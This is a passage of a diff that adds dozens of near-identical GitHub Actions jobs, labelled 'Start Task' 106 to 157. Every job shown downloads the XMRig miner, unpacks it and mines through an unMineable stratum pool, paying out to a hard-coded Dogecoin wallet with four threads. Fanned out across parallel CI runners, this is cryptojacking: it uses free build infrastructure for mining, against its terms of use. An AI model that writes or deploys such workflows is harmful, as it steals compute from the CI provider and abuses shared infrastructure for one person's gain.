+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_106:
+    name: Start Task 106
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 106
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_107:
+    name: Start Task 107
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 107
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_108:
+    name: Start Task 108
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 108
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_109:
+    name: Start Task 109
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 109
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_110:
+    name: Start Task 110
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 110
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_111:
+    name: Start Task 111
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 111
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_112:
+    name: Start Task 112
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 112
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_113:
+    name: Start Task 113
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 113
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_114:
+    name: Start Task 114
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 114
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_115:
+    name: Start Task 115
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 115
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_116:
+    name: Start Task 116
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 116
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_117:
+    name: Start Task 117
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 117
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_118:
+    name: Start Task 118
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 118
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_119:
+    name: Start Task 119
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 119
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_120:
+    name: Start Task 120
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 120
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_121:
+    name: Start Task 121
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 121
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_122:
+    name: Start Task 122
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 122
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_123:
+    name: Start Task 123
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 123
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_124:
+    name: Start Task 124
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 124
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_125:
+    name: Start Task 125
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 125
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_126:
+    name: Start Task 126
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 126
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_127:
+    name: Start Task 127
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 127
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_128:
+    name: Start Task 128
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 128
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_129:
+    name: Start Task 129
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 129
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_130:
+    name: Start Task 130
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 130
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_131:
+    name: Start Task 131
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 131
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_132:
+    name: Start Task 132
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 132
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_133:
+    name: Start Task 133
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 133
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_134:
+    name: Start Task 134
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 134
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_135:
+    name: Start Task 135
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 135
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_136:
+    name: Start Task 136
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 136
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_137:
+    name: Start Task 137
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 137
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_138:
+    name: Start Task 138
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 138
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_139:
+    name: Start Task 139
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 139
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_140:
+    name: Start Task 140
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 140
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_141:
+    name: Start Task 141
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 141
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_142:
+    name: Start Task 142
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 142
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_143:
+    name: Start Task 143
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 143
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_144:
+    name: Start Task 144
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 144
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_145:
+    name: Start Task 145
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 145
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_146:
+    name: Start Task 146
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 146
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_147:
+    name: Start Task 147
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 147
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_148:
+    name: Start Task 148
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 148
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_149:
+    name: Start Task 149
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 149
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_150:
+    name: Start Task 150
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 150
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_151:
+    name: Start Task 151
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 151
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_152:
+    name: Start Task 152
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 152
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_153:
+    name: Start Task 153
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 153
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_154:
+    name: Start Task 154
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 154
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_155:
+    name: Start Task 155
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 155
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_156:
+    name: Start Task 156
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 156
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_157:
+    name: Start Task 157
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 157
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_158:
